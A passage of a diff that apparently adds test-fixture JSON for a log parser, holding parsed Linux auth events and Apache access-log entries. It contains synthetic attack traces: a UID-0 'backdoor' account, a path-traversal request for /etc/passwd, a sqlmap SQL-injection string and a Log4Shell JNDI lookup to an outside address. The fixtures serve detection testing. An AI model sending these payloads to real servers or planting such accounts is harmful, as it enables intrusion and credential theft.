+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.5282Z",
+   "last_at": "2026-11-12T10:40:49.5282Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.543305Z",
+   "last_at": "2026-11-12T10:40:49.543305Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/sh [2 args]",
+   "fields": {
+    "command": "/usr/bin/sh [2 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.559034Z",
+   "last_at": "2026-11-12T10:40:49.559034Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=alice ; COMMAND=/usr/bin/sh [2 args]",
+   "fields": {
+    "command": "/usr/bin/sh [2 args]",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.573687Z",
+   "last_at": "2026-11-12T10:40:49.573687Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice :  PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:40:49.595187Z",
+   "last_at": "2026-11-12T10:40:49.595187Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "alice : TTY=/dev/pts/0 ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "target_user": "root",
+    "tty": "/dev/pts/0"
+   }
+  }
+ ],
+ "testdata/journal/debian-12-forged.jsonl": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-01T23:02:32.33398Z",
+   "last_at": "2026-11-01T23:02:32.33398Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "new user: name=mallory, UID=1000, GID=1000, home=/home/mallory, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-11-01T23:02:32.446286Z",
+   "last_at": "2026-11-01T23:02:32.446286Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "203.0.113.9",
+   "username": "root",
+   "message": "Accepted password for root from 203.0.113.9 port 22 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 22,
+    "session": "39"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-01T23:02:32.504912Z",
+   "last_at": "2026-11-01T23:02:32.504912Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "backdoor",
+   "message": "new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash, from=none",
+   "fields": {
+    "uid": 0
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-01T23:02:32.598071Z",
+   "last_at": "2026-11-01T23:02:32.598071Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1001, GID=1001, home=/home/deploy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-11-01T23:02:43.214558Z",
+   "last_at": "2026-11-01T23:02:43.214558Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "203.0.113.10",
+   "username": "root",
+   "message": "Accepted publickey for root from 203.0.113.10 port 22 ssh2: ED25519 SHA256:x",
+   "fields": {
+    "method": "publickey",
+    "port": 22,
+    "session": "69"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-11-01T23:02:44.347968Z",
+   "last_at": "2026-11-01T23:02:44.347968Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "203.0.113.11",
+   "username": "root",
+   "message": "Accepted password for root from 203.0.113.11 port 22 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 22,
+    "session": "82"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-01T23:03:11.325118Z",
+   "last_at": "2026-11-01T23:03:11.325118Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "backdoor",
+   "message": "new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash, from=none",
+   "fields": {
+    "uid": 0
+   }
+  }
+ ],
+ "testdata/journal/debian-12.auth-sessions.jsonl": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-23T17:59:59.777052Z",
+   "last_at": "2026-11-23T17:59:59.777052Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/true [0 args]",
+   "fields": {
+    "command": "/usr/bin/true [0 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-11-23T18:00:24.700203Z",
+   "last_at": "2026-11-23T18:00:24.700203Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : 1 incorrect password attempt ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/false [0 args]",
+   "fields": {
+    "command": "/usr/bin/false [0 args]",
+    "reason": "incorrect_password",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-11-23T17:59:59.784354Z",
+   "last_at": "2026-11-23T17:59:59.784354Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su-l:session): session opened for user root(uid=0) by (uid=0)",
+   "fields": {
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-23T17:59:59.833309Z",
+   "last_at": "2026-11-23T17:59:59.833309Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "exampleworker",
+   "message": "new user: name=exampleworker, UID=1002, GID=1002, home=/home/exampleworker, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-23T17:59:59.897312Z",
+   "last_at": "2026-11-23T17:59:59.897312Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "exampleworker",
+   "message": "add 'exampleworker' to group 'adm'",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-11-23T18:00:22.706467Z",
+   "last_at": "2026-11-23T18:00:22.706467Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-23T18:00:24.712706Z",
+   "last_at": "2026-11-23T18:00:24.712706Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-23T18:00:46.471942Z",
+   "last_at": "2026-11-23T18:00:46.471942Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/true [0 args]",
+   "fields": {
+    "command": "/usr/bin/true [0 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-23T18:00:46.396689Z",
+   "last_at": "2026-11-23T18:00:46.396689Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/true [3 args]",
+   "fields": {
+    "command": "/usr/bin/true [3 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-23T18:00:46.475171Z",
+   "last_at": "2026-11-23T18:00:46.475171Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "exampleforged",
+   "message": "new user: name=exampleforged, UID=1234",
+   "fields": {
+    "uid": 1234
+   }
+  }
+ ],
+ "testdata/journal/debian-12.jsonl": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:03:40.774502Z",
+   "last_at": "2026-10-31T19:03:40.774502Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "Debian-exim",
+   "message": "new user: name=Debian-exim, UID=101, GID=103, home=/var/spool/exim4, shell=/usr/sbin/nologin, from=none",
+   "fields": {
+    "uid": 101
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:03:44.917144Z",
+   "last_at": "2026-10-31T19:03:44.917144Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "sshd",
+   "message": "new user: name=sshd, UID=102, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none",
+   "fields": {
+    "uid": 102
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:03:46.735985Z",
+   "last_at": "2026-10-31T19:03:46.735985Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:03:46.812922Z",
+   "last_at": "2026-10-31T19:03:46.812922Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "alice",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for alice"
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:03:46.835741Z",
+   "last_at": "2026-10-31T19:03:46.835741Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "bob",
+   "message": "new user: name=bob, UID=1001, GID=1001, home=/home/bob, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:03:46.911886Z",
+   "last_at": "2026-10-31T19:03:46.911886Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "bob",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for bob"
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:03:46.932895Z",
+   "last_at": "2026-10-31T19:03:46.932895Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "root",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for root"
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:03:46.965779Z",
+   "last_at": "2026-10-31T19:03:46.965779Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:03:48.992008Z",
+   "last_at": "2026-10-31T19:03:48.992008Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "admin",
+   "message": "Failed password for invalid user admin from 127.0.0.1 port 37054 ssh2",
+   "fields": {
+    "invalid_user": true,
+    "method": "password",
+    "port": 37054
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:03:52.915543Z",
+   "last_at": "2026-10-31T19:03:52.915543Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Failed password for root from 127.0.0.1 port 37060 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 37060
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:03:54.272756Z",
+   "last_at": "2026-10-31T19:03:54.272756Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "alice",
+   "message": "Failed password for alice from 127.0.0.1 port 50180 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 50180
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:03:54.278496Z",
+   "last_at": "2026-10-31T19:03:54.278496Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T19:03:54.341336Z",
+   "last_at": "2026-10-31T19:03:54.341336Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:03:54.347342Z",
+   "last_at": "2026-10-31T19:03:54.347342Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:03:56.542105Z",
+   "last_at": "2026-10-31T19:03:56.542105Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : 1 incorrect password attempt ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "incorrect_password",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:03:56.554194Z",
+   "last_at": "2026-10-31T19:03:56.554194Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user bob(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "bob"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:03:56.718218Z",
+   "last_at": "2026-10-31T19:03:56.718218Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "bob",
+   "message": "     bob : user NOT in sudoers ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "not_in_sudoers",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:03:56.720858Z",
+   "last_at": "2026-10-31T19:03:56.720858Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:03:56.730869Z",
+   "last_at": "2026-10-31T19:03:56.730869Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:03:58.040507Z",
+   "last_at": "2026-10-31T19:03:58.040507Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1002, GID=1002, home=/home/deploy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:03:58.100714Z",
+   "last_at": "2026-10-31T19:03:58.100714Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "deploy",
+   "message": "add 'deploy' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:03:58.143656Z",
+   "last_at": "2026-10-31T19:03:58.143656Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy added by root to group adm",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:03:58.168688Z",
+   "last_at": "2026-10-31T19:03:58.168688Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy removed by root from group adm",
+   "fields": {
+    "action": "remove",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:03:58.201439Z",
+   "last_at": "2026-10-31T19:03:58.201439Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "deploy",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for deploy"
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-10-31T19:03:58.480862Z",
+   "last_at": "2026-10-31T19:03:58.480862Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-10-31T19:03:58.486914Z",
+   "last_at": "2026-10-31T19:03:58.486914Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) DELETE (alice)",
+   "fields": {
+    "action": "delete",
+    "target_user": "alice"
+   }
+  }
+ ],
+ "testdata/journal/debian-12.sessions.jsonl": [
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-11-09T13:15:59.722547Z",
+   "last_at": "2026-11-09T13:15:59.722547Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Accepted publickey for root from 127.0.0.1 port 32866 ssh2: ED25519 SHA256:/bmSnGV8b/M+7Iz7JDFdEuTpicTSjyZhlfTUrNQFEi8",
+   "fields": {
+    "method": "publickey",
+    "port": 32866,
+    "session": "824"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2026-11-09T13:15:59.725445Z",
+   "last_at": "2026-11-09T13:15:59.725445Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
+   "fields": {
+    "session": "824"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-09T13:15:59.925024Z",
+   "last_at": "2026-11-09T13:15:59.925024Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : TTY=pts/0 ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tty": "pts/0"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2026-11-09T13:15:59.934233Z",
+   "last_at": "2026-11-09T13:15:59.934233Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session closed for user root",
+   "fields": {
+    "session": "824"
+   }
+  }
+ ],
+ "testdata/journal/rocky-9.sessions.jsonl": [
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-11-12T10:06:29.013183Z",
+   "last_at": "2026-11-12T10:06:29.013183Z",
+   "count": 1,
+   "program": "sshd-session",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Accepted publickey for root from 127.0.0.1 port 47300 ssh2: ED25519 SHA256:sI2fMxQtloHsrfsoIglf/ZO3YYLIM2mJX4BbkGyUlOI",
+   "fields": {
+    "method": "publickey",
+    "port": 47300,
+    "session": "75"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2026-11-12T10:06:29.057671Z",
+   "last_at": "2026-11-12T10:06:29.057671Z",
+   "count": 1,
+   "program": "sshd-session",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session opened for user root(uid=0) by root(uid=0)",
+   "fields": {
+    "session": "75"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-12T10:06:29.123998Z",
+   "last_at": "2026-11-12T10:06:29.123998Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : TTY=pts/0 ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tty": "pts/0"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2026-11-12T10:06:29.129924Z",
+   "last_at": "2026-11-12T10:06:29.129924Z",
+   "count": 1,
+   "program": "sshd-session",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session closed for user root",
+   "fields": {
+    "session": "75"
+   }
+  }
+ ],
+ "testdata/web/apache2.access.log": [
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET / HTTP/1.1\" 200 10956 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET / HTTP/1.1\" 200 10956 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted] HTTP/1.1\" 200 10956 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted]",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/wp-login.php",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /..%2f..%2fetc/passwd HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/..%2f..%2fetc/passwd",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /products?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1\" 404 475 \"-\" \"sqlmap/1.7 (https://sqlmap.org)\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/products?id=1%27%20UNION%20SELECT%201,2--",
+    "status": 404,
+    "user_agent": "sqlmap/1.7 (https://sqlmap.org)"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"DELETE /api/orders/1 HTTP/1.1\" 405 541 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 541,
+    "method": "DELETE",
+    "path": "/api/orders/1",
+    "status": 405,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET / HTTP/1.1\" 200 10956 \"-\" \"${jndi:ldap://203.0.113.9/a}\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "${jndi:ldap://203.0.113.9/a}"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /q HTTP/1.1\" 404 475 \"-\" \"agent with \\\"quotes\\\"\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/q",
+    "status": 404,
+    "user_agent": "agent with \"quotes\""
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"POST /login HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "POST",
+    "path": "/login",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET / HTTP/1.1\" 200 10956 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted] HTTP/1.1\" 200 10956 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted]",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/wp-login.php",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /..%2f..%2fetc/passwd HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/..%2f..%2fetc/passwd",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
